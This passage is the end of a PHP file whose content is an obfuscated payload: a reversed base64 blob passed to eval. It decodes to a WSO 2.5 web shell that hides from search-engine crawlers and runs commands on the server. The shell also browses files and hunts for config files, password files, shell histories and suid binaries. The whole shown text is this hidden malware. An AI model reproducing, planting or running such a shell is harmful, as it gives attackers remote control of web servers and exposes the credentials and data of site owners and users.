UYnLCdvZm5JY2VTJz49J29mbkkgLmNlUycoeWFycmEgPSBtJAkKCjsnPm5vaXRwby88Jy5tZXRpJC4nPicuKScnOidkZXRjZWxlcyc/bWV0aSQ9PV0ndGVzcmFoYydbVFNPUF8kKC4nICInLm1ldGkkLiciPWV1bGF2IG5vaXRwbzwnID0uIHN0ZXNyYWhjX3RwbyQJCQopbWV0aSQgc2Egc3Rlc3JhaGMkKGhjYWVyb2YJCjsnJyA9IHN0ZXNyYWhjX3RwbyQJCjspJzY2OHBjJyAsJ1UtOElPSycgLCdSLThJT0snICwnMTUyMS1zd29kbmlXJyAsJzgtRlRVJyh5YXJyYSA9IHN0ZXNyYWhjJAkKCn0JCjsiPmEvPC8iLl1pJFtodGFwJC4iPicpIlwiID0uIHNrbmlsX2R3YyQJCQo7Jy8nLl1qJFtodGFwJCA9LiBza25pbF9kd2MkCQkJCikrK2okIDtpJD08aiQgOzA9aiQocm9mCQkKOyIiXCwiXG5hTXNlbGlGIlwoZyc9a2NpbGNubyAnIyc9ZmVyaCBhPCIgPS4gc2tuaWxfZHdjJAkJCnsgKSsraSQgOzEtbiQ8aSQgOzA9aSQocm9mCQo7KWh0YXAkKHRudW9jPW4kCQo7KV0nZHdjJ1tTTEFCT0xHJCAsIi8iKGVkb2xweGUgPSBodGFwJAkKOycnID0gc2tuaWxfZHdjJAkKCn0JCjtdJ2RpZydbZGlnJCA9IGRpZyQJCQo7XSdlbWFuJ1tkaWckID0gcHVvcmckCQkKO10nZGl1J1tkaXUkID0gZGl1JAkJCjtdJ2VtYW4nW2RpdSQgPSByZXN1JAkJCjspKShkaWdldGVnX3hpc29wKGRpZ3JndGVnX3hpc29wQCA9IGRpZyQJCQo7KSkoZGl1ZXRlZ194aXNvcChkaXV3cHRlZ194aXNvcEAgPSBkaXUkCQkKeyBlc2xlIH0JCjsiPyIgPSBwdW9yZyQJCQo7KShkaWd5bXRlZ0AgPSBkaWckCQkKOykoZGl1eW10ZWdAID0gZGl1JAkJCjspKHJlc3VfdG5lcnJ1Y190ZWdAID0gcmVzdSQJCQp7ICkpJ2RpZ2V0ZWdfeGlzb3AnKHN0c2l4ZV9ub2l0Y251ZiEoZmkJCjspJ3MnKGVtYW51X3BocEAgPSBsZW5yZWskCQo7KSdyJyhlbWFudV9waHBAID0gZXNhZWxlciQJCjsxOmVjYXBTbGF0b3QkP2VjYXBTbGF0b3QkID0gZWNhcFNsYXRvdCQJCjspXSdkd2MnW1NMQUJPTEckKGVjYXBzX2xhdG90X2tzaWRAID0gZWNhcFNsYXRvdCQJCjspXSdkd2MnW1NMQUJPTEckKGVjYXBzZWVyZmtzaWRAID0gZWNhcFNlZXJmJAkKOyI+bXJvZi88Cj50ZXNyYWhjPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8Cj4zcD1lbWFuIG5lZGRpaD1lcHl0IHR1cG5pPAo+MnA9ZW1hbiBuZWRkaWg9ZXB5dCB0dXBuaTwKPjFwPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8Cj5jPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8Cj5hPWVtYW4gbmVkZGloPWVweXQgdHVwbmk8Cj4nO2Vub246eWFscHNpZCc9ZWx5dHMgZm09ZW1hbiB0c29wPWRvaHRlbSBtcm9mPAo+JzswOnRmZWw7MDpwb3Q7NDQ0Izpyb2xvYy1kbnVvcmdrY2FiOyUwMDE6aHRkaXc7ZXR1bG9zYmE6bm9pdGlzb3AnPWVseXRzIHZpZDw+eWRvYjw+ZGFlaDwKPnRwaXJjcy88Cn0JCjspJyFyb3JyZSB0c2V1cWVSJyh0cmVsYSBlc2xlIH0JCQkKOykpXTFbcnJhICwwKHJ0c2J1cy5dMltycmEobGF2ZQkJCQkKOyl0eGVUZXNub3BzZXIucWVyKGNleGUuZ2VyPXJyYSByYXYJCQkJCjspJ20nICwiXCkqXXNcXFxcU1xcXFxbKCkrZFxcXFwoIlwocHhFZ2VSIHdlbiA9IGdlciByYXYJCQkJCnsgKTAwMiA9PSBzdXRhdHMucWVyKGZpCQkJCikgKTQgPT0gZXRhdFN5ZGFlci5xZXIoIChmaQkJCnsgKShlZ25haENxZVJzc2Vjb3JwIG5vaXRjbnVmCQp9CQp9ICAgICAgICAKOylzbWFyYXAoZG5lcy5xZXIgICAgICAgICAgICAKOyknZGVkb2NuZWxydS1tcm9mLXd3dy14L25vaXRhY2lscHBhJyAsJ2VweVQtdG5ldG5vQycoIHJlZGFlSHRzZXVxZVJ0ZXMucWVyICAgICAgICAgICAgCjspZXVydCAsbHJ1ICwnVFNPUCcobmVwby5xZXIgICAgICAgICAgICAKO2VnbmFoQ3FlUnNzZWNvcnAgPSBlZ25haGNldGF0c3lkYWVybm8ucWVyICAgICAgICAgICAgCnsgKXFlciggZmkgICAgICAgIAo7KSdQVFRITE1YLnRmb3NvcmNpTScodGNlamJPWGV2aXRjQSB3ZW4gPSBxZXIJCQkKKXRjZWpiT1hldml0Y0Eud29kbml3KCBmaSBlc2xlCQkKOykodHNldXFlUnB0dEhMTVggd2VuID0gcWVyCQkJCil0c2V1cWVScHR0SExNWC53b2RuaXcoIGZpCQkKeyApc21hcmFwICxscnUocnMgbm9pdGNudWYJCn0JCjspc21hcmFwICwnIi4gKV0nSVJVX1RTRVVRRVInW1JFVlJFU18kKHNlaHNhbHNkZGEgLiAiJyhycwkJCjspZXVsYXYuXWlbc3RuZW1lbGUuZm0uZCh0bmVub3Btb0NJUlVlZG9jbmUrJz0nK2VtYW4uXWlbc3RuZW1lbGUuZm0uZCsnJicgPSsgc21hcmFwCQkJCikrK2k7aHRnbmVsLnN0bmVtZWxlLmZtLmQ8aTswPWkocm9mCQkKOydldXJ0PXhhamEnID0gc21hcmFwIHJhdgkJCjspdGVzcmFoYywzcCwycCwxcCxjLGEodGVzCQkKeyApdGVzcmFoYywzcCwycCwxcCxjLGEoYSBub2l0Y251ZgkKfQkKOykodGltYnVzLmZtLmQJCQo7KXRlc3JhaGMsM3AsMnAsMXAsYyxhKHRlcwkJCnsgKXRlc3JhaGMsM3AsMnAsMXAsYyxhKGcgbm9pdGNudWYJCn0JCjtfdGVzcmFoYz1ldWxhdi50ZXNyYWhjLmZtLmQgZXNsZTt0ZXNyYWhjPWV1bGF2LnRlc3JhaGMuZm0uZClsbHVuPSF0ZXNyYWhjKGZpLy8JCQo7X3Rlc3JhaGM9ZXVsYXYudGVzcmFoYy5mbS5kIGVzbGU7dGVzcmFoYz1ldWxhdi50ZXNyYWhjLmZtLmQpbGx1bj0hdGVzcmFoYyhmaQkJCjtfM3A9ZXVsYXYuM3AuZm0uZCBlc2xlOzNwPWV1bGF2LjNwLmZtLmQpbGx1bj0hM3AoZmkJCQo7XzJwPWV1bGF2LjJwLmZtLmQgZXNsZTsycD1ldWxhdi4ycC5mbS5kKWxsdW49ITJwKGZpCQkKO18xcD1ldWxhdi4xcC5mbS5kIGVzbGU7MXA9ZXVsYXYuMXAuZm0uZClsbHVuPSExcChmaQkJCjtfYz1ldWxhdi5jLmZtLmQgZXNsZTtjPWV1bGF2LmMuZm0uZClsbHVuPSFjKGZpCQkKO19hPWV1bGF2LmEuZm0uZCBlc2xlO2E9ZXVsYXYuYS5mbS5kKWxsdW49IWEoZmkJCQp7ICl0ZXNyYWhjLDNwLDJwLDFwLGMsYSh0ZXMgbm9pdGNudWYJCjt0bmVtdWNvZCA9IGQgcmF2ICAgIAo7JyIuICkpU0VUT1VRX1RORSxdJzNwJ1tUU09QXyQoc3JhaGNsYWljZXBzbG10aDonJz8pZXNsYWY9PSEpIm5cIixdJzNwJ1tUU09QXyRAKHNvcHJ0cygoIC4gIicgPSBfM3AgcmF2ICAgIAo7JyIuICkpU0VUT1VRX1RORSxdJzJwJ1tUU09QXyQoc3JhaGNsYWljZXBzbG10aDonJz8pZXNsYWY9PSEpIm5cIixdJzJwJ1tUU09QXyRAKHNvcHJ0cygoIC4gIicgPSBfMnAgcmF2ICAgIAo7JyIuICkpU0VUT1VRX1RORSxdJzFwJ1tUU09QXyQoc3JhaGNsYWljZXBzbG10aDonJz8pZXNsYWY9PSEpIm5cIixdJzFwJ1tUU09QXyRAKHNvcHJ0cygoIC4gIicgPSBfMXAgcmF2ICAgIAo7JyIuICldJ3Rlc3JhaGMnW1RTT1BfJEAoc3JhaGNsYWljZXBzbG10aCAuICInID0gX3Rlc3JhaGMgcmF2ICAgIAonIi4gKV0nYSdbVFNPUF8kQChzcmFoY2xhaWNlcHNsbXRoIC4gIicgPSBfYSByYXYgICAgCjsnIiAuICldJ2R3YydbU0xBQk9MRyQoc3JhaGNsYWljZXBzbG10aCAuICInID0gX2MgcmF2ICAgIAo+dHBpcmNzPAo+ZWx5dHMvPAp9O2VjYXBzb25vTSxyZWlydW9DOnlsaW1hZi10bm9me2VycAp9MzMzIzpyb2xvYy1kbnVvcmdrY2FiezJsLgp9NDQ0Izpyb2xvYy1kbnVvcmdrY2FiezFsLgp9ZTVlNWU1Izpyb2xvYy1kbnVvcmdrY2Fie3Jldm9oOnJ0IG5pYW0uCn07ZTVlNWU1Izpyb2xvYy1kbnVvcmdrY2FiO3RmZWw6bmdpbGEtdHhldHtodCBuaWFtLgp9IHhwMDAzIDpodGRpdyB7cG5Jc2xvb3QuCn0gO3JldG5lYzpuZ2lsYS10eGV0IHtsYlRzbG9vdCMKfSA7eHAwOm5pZ3JhbSB7bXJvZgp9IDsnd2VOIHJlaXJ1b0MnLGVjYXBzb25vTSB0cDkgOnRub2YgO3JvbG9jJCBkaWxvcyB4cDE6cmVkcm9iOzU1NSM6cm9sb2MtZG51b3Jna2NhYjtmZmYjOnJvbG9jOzA6bmlncmFtIHt0Y2VsZXMsYWVyYXR4ZXQsdHVwbmkKfSA7eHAwMDM6dGhnaWVoOyUwMDE6aHRkaXcge2FlcmFnaWIuCn0gO290dWEgOndvbGZyZXZvOzA6bmlncmFtO3hwNTpnbmlkZGFwOzQ0NCMgZGlsb3MgeHAxOnJlZHJvYiB7MWxtLgp9IDtlbmlscmVkbnU6bm9pdGFyb2NlZC10eGV0IHtyZXZvaDphCn0gO2Vub246bm9pdGFyb2NlZC10eGV0IHthCn0gOzMzMyM6cm9sb2MtZG51b3Jna2NhYjt4cDU6dGZlbC1uaWdyYW07eHA1IDpnbmlkZGFwIHt0bmV0bm9jLnZpZAp9IDt4cDA6bmlncmFtOzIyMiM6cm9sb2MtZG51b3Jna2NhYjthbmFkcmVWIHRwNDEgOnRub2Y7eHA1IHhwMiA6Z25pZGRhcDtyb2xvYyQgZGlsb3MgeHA1OnRmZWwtcmVkcm9iIHsxaAp9IDtyZWRsb2IgOnRoZ2lldy10bm9mIHtuYXBzCn0gO3RuYXRyb3BtaSEgcm9sb2MkIDpyb2xvYyB7YSwxaCxuYXBzCn0gOzIyMiM6cm9sb2MtZG51b3Jna2NhYjtmZmYjOnJvbG9jIHtvZm5pLmVsYmF0Cn0gOzFlMWUxZSM6cm9sb2M7cG90Om5naWxhLWxhY2l0cmV2OzA6bmlncmFtO2FuYWRyZVYsYWRpY3VMIHRwOSA6dG5vZiB7aHQsZHQseWRvYgp9OzFlMWUxZSM6cm9sb2M7NDQ0Izpyb2xvYy1kbnVvcmdrY2Fie3lkb2IKPmVseXRzPAo+ZWx0aXQvPCIuIF0nVFNPSF9QVFRIJ1tSRVZSRVNfJCAuICI+ZWx0aXQ8PiciIC4gXSd0ZXNyYWhjJ1tUU09QXyQgLiAiPXRlc3JhaGMgO2xtdGgvdHhldCc9dG5ldG5vYyAnZXB5VC10bmV0bm9DJz12aXVxZS1wdHRoIGF0ZW08PmRhZWg8PmxtdGg8IiBvaGNlCQo7cm9sb2MkIGxhYm9sZwkKO10ndGVzcmFoY190bHVhZmVkJ1tTTEFCT0xHJCA9IF0ndGVzcmFoYydbVFNPUF8kCQkKKSldJ3Rlc3JhaGMnW1RTT1BfJCh5dHBtZShmaQkKeyApKHJlZGFlSG9zdyBub2l0Y251ZgoKOykJCiJ2aXJwIGV0YWNvbCIgPj0gInNlbGlmIHZpcnAgZXRhY29sIgkJCiwicG11ZCBldGFjb2wiID49ICJzZWxpZiBwbXVkIGV0YWNvbCIJCQosInB1a2NhYiBldGFjb2wiID49ICJzZWxpZiBwdWtjYWIgZXRhY29sIgkJCiwiJ2NybGlhbWhjdGVmLicgZXRhY29sIiA+PSAic2VsaWYgY3JsaWFtaGN0ZWYuIGV0YWNvbCIJCQosIid5cm90c2loX2xxc3ltLicgZXRhY29sIiA+PSAic2VsaWYgeXJvdHNpaF9scXN5bS4gZXRhY29sIgkJCiwiJ3lyb3RzaWhfaHNhYi4nIGV0YWNvbCIgPj0gInNlbGlmIHlyb3RzaWhfaHNhYi4gZXRhY29sIgkJCiwiJ2R3c3NhcHRoLicgZXRhY29sIiA+PSAic2VsaWYgZHdzc2FwdGguIGV0YWNvbCIJCQosIidscXMuJyBldGFjb2wiID49ICJzZWxpZiBscXMuIGV0YWNvbCIJCQosIidkd3AuJyBldGFjb2wiID49ICJzZWxpZiBkd3AuIGV0YWNvbCIJCQosIidmbm9jLicgZXRhY29sIj49InNlbGlmIGZub2MuIGV0YWNvbCIJCQosImdpZm5vYyBldGFjb2wiID49ICIgc2VsaWYgKmdpZm5vYyBldGFjb2wiCQkKLCJwaHAudGx1YWZlZC5naWZub2MgZXRhY29sIiA+PSAic2VsaWYgcGhwLnRsdWFmZWQuZ2lmbm9jIGV0YWNvbCIJCQosInBocC5jbmkuZ2lmbm9jIGV0YWNvbCIgPj0gInBocC5jbmkuZ2lmbm9jIGV0YWNvbCIJCQosImNuaS5naWZub2MgZXRhY29sIiA+PSAic2VsaWYgY25pLmdpZm5vYyBldGFjb2wiCQkKLCJwaHAuZ2lmbm9jIGV0YWNvbCIgPj0gInNlbGlmIHBocC5naWZub2MgZXRhY29sIgkJCiwidGFkLmdpZm5vYyBldGFjb2wiID49ICJzZWxpZiB0YWQuZ2lmbm9jIGV0YWNvbCIJCQosInBocC5mbm9jIGV0YWNvbCIgPj0gInNlbGlmIHBocC5mbm9jIGV0YWNvbCIJCQosInBocC5nZmMgZXRhY29sIiA+PSAic2VsaWYgcGhwLmdmYyBldGFjb2wiCQkKLCJwaHAubmltZGEgZXRhY29sIj49ICJzZWxpZiBwaHAubmltZGEgZXRhY29sIgkJCiwiZm5vYy55bSBldGFjb2wiID49ICJzZWxpZiBmbm9jLnltIGV0YWNvbCIJCQosImZub2MuY25ieXNwIGV0YWNvbCIgPj0gInNlbGlmIGZub2MuY25ieXNwIGV0YWNvbCIJCQosImZub2MuZHB0Zm9ycCBldGFjb2wiID49ICJzZWxpZiBmbm9jLmRwdGZvcnAgZXRhY29sIgkJCiwiZm5vYy5zdHNvaHYgZXRhY29sIiA+PSAic2VsaWYgZm5vYy5zdHNvaHYgZXRhY29sIgkJCiwiZm5vYy5kcHR0aCBldGFjb2wiID49ICJzZWxpZiBmbm9jLmRwdHRoIGV0YWNvbCIJCSAgCiwiIiA+PSAiZXRhY29MIgkJCiwiY3JsaWFtaGN0ZWYuIGVtYW4tIGYgZXB5dC0gLiBkbmlmIiA+PSAicmlkIHRuZXJydWMgbmkgc2VsaWYgY3JsaWFtaGN0ZWYuIGRuaWYiCQkgIAosImNybGlhbWhjdGVmLiBlbWFuLSBmIGVweXQtIC8gZG5pZiIgPj0gInNlbGlmIGNybGlhbWhjdGVmLiBsbGEgZG5pZiIJCSAgCiwieXJvdHNpaF9oc2FiLiBlbWFuLSBmIGVweXQtIC4gZG5pZiIgPj0gInJpZCB0bmVycnVjIG5pIHNlbGlmIHlyb3RzaWhfaHNhYi4gZG5pZiIJCSAgCiwieXJvdHNpaF9oc2FiLiBlbWFuLSBmIGVweXQtIC8gZG5pZiIgPj0gInNlbGlmIHlyb3RzaWhfaHNhYi4gbGxhIGRuaWYiCQkgIAosImR3c3NhcHRoLiBlbWFuLSBmIGVweXQtIC4gZG5pZiIgPj0gInJpZCB0bmVycnVjIG5pIHNlbGlmIGR3c3NhcHRoLiBkbmlmIgkJICAKLCJkd3NzYXB0aC4gZW1hbi0gZiBlcHl0LSAvIGRuaWYiID49ICJzZWxpZiBkd3NzYXB0aC4gbGxhIGRuaWYiCQkgIAosImR3cC5lY2l2cmVzIGVtYW4tIGYgZXB5dC0gLiBkbmlmIiA+PSAicmlkIHRuZXJydWMgbmkgc2VsaWYgZHdwLmVjaXZyZXMgZG5pZiIJCSAgCiwiZHdwLmVjaXZyZXMgZW1hbi0gZiBlcHl0LSAvIGRuaWYiID49ICJzZWxpZiBkd3AuZWNpdnJlcyBsbGEgZG5pZiIJCSAgCiwic2wtIDItIG1yZXAtIC4gZG5pZiIgPj0gInJpZCB0bmVycnVjIG5pIHNlbGlmIGRuYSBzcmVkbG9mIGVsYmF0aXJ3IGxsYSBkbmlmIgkJICAKLCJzbC0gMi0gbXJlcC0gLyBkbmlmIiA+PSAic2VsaWYgZG5hIHNyZWRsb2YgZWxiYXRpcncgbGxhIGRuaWYiCQkgIAosIiJcKmdpZm5vYyJcIGVtYW4tIGYgZXB5dC0gLiBkbmlmIiA+PSAicmlkIHRuZXJydWMgbmkgc2VsaWYgKmdpZm5vYyBkbmlmIgkJICAKLCIiXCpnaWZub2MiXCBlbWFuLSBmIGVweXQtIC8gZG5pZiIgPj0gInNlbGlmICpnaWZub2MgZG5pZiIJCSAgCiwicGhwLmNuaS5naWZub2MgZW1hbi0gZiBlcHl0LSAvIGRuaWYiID49ICJzZWxpZiBwaHAuY25pLmdpZm5vYyBkbmlmIgkJICAKLCJzbC0gMDAwMjAtIG1yZXAtIGYgZXB5dC0gLiBkbmlmIiA+PSAicmlkIHRuZXJydWMgbmkgc2VsaWYgZGlncyBkbmlmIgkJICAKLCJzbC0gMDAwMjAtIG1yZXAtIGYgZXB5dC0gLyBkbmlmIiA+PSAic2VsaWYgZGlncyBsbGEgZG5pZiIJCSAgCiwic2wtIDAwMDQwLSBtcmVwLSBmIGVweXQtIC4gZG5pZiIgPj0gInJpZCB0bmVycnVjIG5pIHNlbGlmIGRpdXMgZG5pZiIJCSAgCiwic2wtIDAwMDQwLSBtcmVwLSBmIGVweXQtIC8gZG5pZiIgPj0gInNlbGlmIGRpdXMgbGxhIGRuaWYiCQkgIAosIiIgPj0gImRuaUYiCQkKLCJ4dWEgc3AiID49ICJzdXRhdHMgc3NlY29ycCIgICAgICAgIAosIm5ldHNpbCBpLSBwZXJnIHwgbmEtIHRhdHN0ZW4iID49ICJzdHJvcCBkZW5lcG8gd29ocyIJCSAgCiwiYXYtIHJ0dGFzbCIgPj0gIm1ldHN5cyBlbGlmIGRlZG5ldHhlIGRub2NlcyB4dW5pTCBhIG5vIHNldHViaXJ0dGEgZWxpZiB0c2lsIgkJCiwiYWhsLSBzbCIgPj0gInJpZCB0c2lMIgkJICAKKHlhcnJhID0gc2VzYWlsYSQJCmVzbGUKOykJCiJsbGEvIGdpZm5vY3BpIiA+PSAibm9pdGFydWdpZm5vQyBQSSIJCQosImEtIHByYSIgPj0gImVsYmFUIFBSQSIJCQosIndlaXYgdGVuIiA+PSAic3JldHVwbW9jIHdvaFMiCSAgICAKLCJyZXN1IHRlbiIgPj0gInN0bnVvY2NhIHJlc1UiCSAgICAKLCJ0cmF0cyB0ZW4iID49ICJzZWNpdnJlcyBnbmlubnVyIHdvaFMiCSAgICAKLCJuYS0gdGF0c3RlbiIgPj0gInNub2l0Y2Vubm9jIGV2aXRjYSB3b2hTIgkgICAgCiwicGhwLipnaWZub2MqIGIvIHcvIHMvIHJpZCIgPj0gInJpZCB0bmVycnVjIG5pIHBocC4qZ2lmbm9jKiBkbmlGIgkgICAgCiwicGhwLnhlZG5pIGIvIHcvIHMvIHJpZCIgPj0gInJpZCB0bmVycnVjIG5pIHBocC54ZWRuaSBkbmlGIgkgICAgCiwicmlkIiA+PSAieXJvdGNlcmlEIHRzaUwiCQkKKHlhcnJhID0gc2VzYWlsYSQJCiknbml3JyA9PSBzbyQoZmkKCjt4YWphX2VzdV90bHVhZmVkJClsb29iKCA9IF0neGFqYScgLiApXSdUU09IX1BUVEgnW1JFVlJFU18kKDVkbVtFSUtPT0NfJCAgICAKKSldJ3hhamEnIC4gKV0nVFNPSF9QVFRIJ1tSRVZSRVNfJCg1ZG1bRUlLT09DXyQodGVzc2khKGZpCgo7Jy8nID0uIGR3YyQJCiknLycgPSEgXTEtKWR3YyQobmVscnRzW2R3YyQoZmkKfQo7KWR3YyQgLCIvIiAsIlxcIihlY2FscGVyX3J0cyA9IGR3YyQJCjspZHdjX2Vtb2gkICwiLyIgLCJcXCIoZWNhbHBlcl9ydHMgPSBkd2NfZW1vaCQJCnsgKSduaXcnID09IHNvJChmaQo7KShkd2N0ZWdAID0gZHdjJAo7KV0nYydbVFNPUF8kKHJpZGhjQAkKKSldJ2MnW1RTT1BfJCh0ZXNzaShmaQo7KShkd2N0ZWdAID0gZHdjX2Vtb2gkCjspJ3Nub2l0Y251Zl9lbGJhc2lkJyh0ZWdfaW5pQCA9IHNub2l0Y251Zl9lbGJhc2lkJAoKOykwKGduaXRyb3Blcl9yb3JyZSAgICAKKWVkb21fZWZhcyQhKGZpCjspJ2Vkb21fZWZhcycodGVnX2luaUAgPSBlZG9tX2VmYXMkCgoKOyd4aW4nID0gc28kCQplc2xlCjsnbml3JyA9IHNvJAkKKSJuaXciID09ICkpMywwLFNPX1BIUChydHNidXMocmV3b2xvdHJ0cyhmaQoKfQo7KXYkICxrJChlaWtvb2N0ZXMgICAgCjt2JCA9IF1rJFtFSUtPT0NfJCAgICAKeyApdiQgLGskKGVpa29vY3Rlc09TVyBub2l0Y251ZgoKfQp9CQo7KUVJS09PQ18kKHNlaHNhbHNwaXJ0c09TVyA9IEVJS09PQ18kCQkKOylUU09QXyQoc2Voc2Fsc3BpcnRzT1NXID0gVFNPUF8kCQkKfQkJCjspeWFycmEkKHNlaHNhbHNwaXJ0cyA6ICl5YXJyYSQgLCdzZWhzYWxzcGlydHNPU1cnKHBhbV95YXJyYSA/ICl5YXJyYSQoeWFycmFfc2kgbnJ1dGVyCQkJCnsgKXlhcnJhJChzZWhzYWxzcGlydHNPU1cgbm9pdGNudWYJCQp7ICkpKGNwZ19zZXRvdXFfY2lnYW1fdGVnKGZpCQp7KSkiY3BnX3NldG91cV9jaWdhbV90ZWciKHN0c2l4ZV9ub2l0Y251ZihmaQoKOyknNS4yJyAsJ05PSVNSRVZfT1NXJyhlbmlmZWRACjspMChlbWl0bnVyX3NldG91cV9jaWdhbV90ZXNACQopMDAwMDcgPCBESV9OT0lTUkVWX1BIUCggZmkKOykwKHRpbWlsX2VtaXRfdGVzQAo7KTAsJ2VtaXRfbm9pdHVjZXhlX3hhbScodGVzX2luaUAKOykwLCdzcm9ycmVfZ29sJyh0ZXNfaW5pQAo7KUxMVU4sJ2dvbF9yb3JyZScodGVzX2luaUAKCn0KfSAgICAKO3RpeGUgICAgICAgIAo7KSdkbnVvRiB0b04gNDA0IDAuMS9QVFRIJyhyZWRhZWggICAgICAgIAp7ICkpXSdUTkVHQV9SRVNVX1BUVEgnW1JFVlJFU18kICwnaS8nIC4gKXN0bmVnQXJlc3UkICwnfCcoZWRvbHBtaSAuICcvJyhoY3RhbV9nZXJwKGZpICAgIAo7KSJyZWxibWFSIiAsInhlZG5hWSIgLCJyZXZpaGNyYV9haSIgLCJ0b0JOU00iICwicHJ1bFMiICwiZWxnb29HIih5YXJyYSA9IHN0bmVnQXJlc3UkICAgIAp7ICkpXSdUTkVHQV9SRVNVX1BUVEgnW1JFVlJFU18kKHl0cG1lIShmaQoKOycxNTIxLXN3b2RuaVcnID0gdGVzcmFoY190bHVhZmVkJAo7ZXVydCA9IHhhamFfZXN1X3RsdWFmZWQkCjsnbmFNc2VsaUYnID0gbm9pdGNhX3RsdWFmZWQkCjsiNWZkIyIgPSByb2xvYyQKCn0KfQkKOylnbmlkb2NuZV9vdCQgLCBTRVRPVVFfVE5FICwpZ25pZG9jbmVfbW9yZiQgLFNFVE9VUV9UTkUgLGduaXJ0cyQoc2VpdGl0bmVsbXRoKGVkb2NlZF95dGl0bmVfbG10aCBucnV0ZXIJCQp7KWduaXJ0cyQgLGduaWRvY25lX290JCAsZ25pZG9jbmVfbW9yZiQodm5vY2kgbm9pdGNudWYJCnsgKSkndm5vY2knKHN0c2l4ZV9ub2l0Y251ZiEoIGZpCn0KfQkKOylnbmlkb2NuZV9tb3JmJCAsZ25pZG9jbmVfb3QkICxnbmlydHMkKGduaWRvY25lX3RyZXZub2NfYm0gbnJ1dGVyCQkKeylnbmlydHMkICxnbmlkb2NuZV9vdCQgLGduaWRvY25lX21vcmYkKHZub2NpIG5vaXRjbnVmCQp7ICkpJ2duaWRvY25lX3RyZXZub2NfYm0nKHN0c2l4ZV9ub2l0Y251ZiAmJiApJ3Zub2NpJyhzdHNpeGVfbm9pdGNudWYhKCBmaQp9Cn0gICAgCjspZ25pcnRzJCAsZ25pZG9jbmVfdHVwdHVvJCAsZ25pZG9jbmVfdHVwbmkkKHZub2NpYmlsIG5ydXRlciAgICAgICAgCnsgKWduaXJ0cyQgLGduaWRvY25lX3R1cHR1byQgLGduaWRvY25lX3R1cG5pJCh2bm9jaSBub2l0Y251ZiAgICAKeyApKSd2bm9jaWJpbCcoc3RzaXhlX25vaXRjbnVmICYmICkndm5vY2knKHN0c2l4ZV9ub2l0Y251ZiEoIGZpCgo='))); ?>
